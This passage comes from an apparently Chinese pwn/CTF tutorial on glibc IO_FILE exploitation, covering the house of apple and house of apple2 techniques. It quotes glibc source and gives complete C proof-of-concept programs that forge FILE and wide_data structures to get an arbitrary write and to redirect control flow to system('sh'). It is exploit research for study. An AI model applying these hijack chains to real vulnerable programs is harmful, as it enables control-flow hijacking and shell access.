*fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line">  <span class="comment">/*绕过点 1 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>_IO_wstrnfile</code>定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure></div>

<p>因此控制了 <code>_wide_data</code> 指针就能完成任意地址写。</p>
<p><strong>需要绕过的点</strong></p>
<ul>
<li>为了能够进入 <code>_IO_wstrn_overflow</code> 函数的 <code>if</code> 判断中，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 。</li>
<li>为了避免执行 <code>free (f-&gt;_wide_data-&gt;_IO_buf_base);</code> 需要满足 <code>f-&gt;_wide_data-&gt;_IO_buf_base</code> 为空或者 <code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF</code> 不为 0 ，其中 <code>_IO_FLAGS2_USER_WBUF</code> 为 <code>8</code> 。</li>
<li>另外如果利用 <code>FSOP</code> 触发需要满足：   <ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
</li>
</ul>
<h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>自行修改偏移。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编译环境 libc6_2.35-0ubuntu3.1_amd64.so</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base + <span class="number">0x215A00</span> + <span class="number">0x3c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    <span class="built_in">fcloseall</span>();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231210140206622.png"
                      alt="image-20231210140206622"
                ></p>
<h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a><a class="link"   href="https://bbs.kanxue.com/thread-273832.htm" >house of apple2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p>这里把<code>roderick</code>师傅写的几个利用方式都写了一个 <code>POC</code>。</p>
<p><strong>前置条件</strong></p>
<ul>
<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li>
</ul>
<h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p><code>struct _IO_wide_data</code>结构体有一个<code>  const struct _IO_jump_t *_wide_vtable</code>成员。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable; <span class="comment">// 偏移0xe0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>而我们的<code>_IO_WOVERFLOW</code> 没有 <code>IO_validate_vtable</code> 检查。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure></div>

<p>因此，我们可以劫持 <code>IO_FILE_plus</code> 的 <code>vtable</code> 为 <code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>
<h2 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用<code>_IO_wfile_overflow</code>函数控制程序执行流</h2><h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<h3 id="函数调用链"><a href="#函数调用链" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wfile_overflow-&gt; _IO_wdoallocbuf-&gt; _IO_WDOALLOCATE-&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">            <span class="comment">/* 这里调用了 _IO_wdoallocbuf () 函数 */</span></span><br><span class="line">	  		_IO_wdoallocbuf (f);</span><br><span class="line">	  		_IO_free_wbackup_area (f);</span><br><span class="line">	  		_IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                       f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">			[...]</span><br><span class="line">		&#125;</span><br><span class="line">		[...]</span><br><span class="line">    &#125;</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">        <span class="comment">/*满足条件则会调用 _IO_WDOALLOCATE*/</span></span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE(fp) != WEOF)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure></div>

<p>这里会去调用 <code>FP-&gt;doallocate</code>，也就是我们 <code>struct _IO_jump_t</code> 偏移 <code>0x68</code> 的位置，我们可以将其截获为 <code>one_gadget</code>。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x2160C0</span>; <span class="comment">// vtable, 0x215F40, 0x216000</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x18</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用<code>_IO_wfile_underflow_mmap</code>函数控制程序执行流</h2><h3 id="相关配置-1"><a href="#相关配置-1" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<h3 id="函数调用链-1"><a href="#函数调用链-1" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wfile_underflow_mmap-&gt; _IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这里有一个 bug? 直接搜和点击 _IO_wfile_underflow_mmap 都无法搜索到相关内容 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *cd;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_1 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">      <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_2 */</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_3 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">          <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">          fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="comment">/* 需要调用到这里 */</span></span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">  